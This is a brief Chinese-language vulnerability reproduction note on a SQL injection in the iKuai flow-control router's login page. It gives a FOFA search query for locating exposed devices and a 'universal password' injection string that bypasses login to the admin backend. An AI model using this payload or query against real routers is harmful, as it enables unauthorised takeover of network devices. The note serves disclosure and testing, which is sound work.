# iKuai 流控路由 SQL注入漏洞

## 漏洞描述

iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限

## 漏洞影响

```
iKuai 流控路由
```

## FOFA

```
title="登录爱快流控路由"
```

## 漏洞复现

登录页面如下

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140931704.png)

使用万能密码登录后台

```plain
user: "or""=""or""="
pass: 空
```

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140931830.png)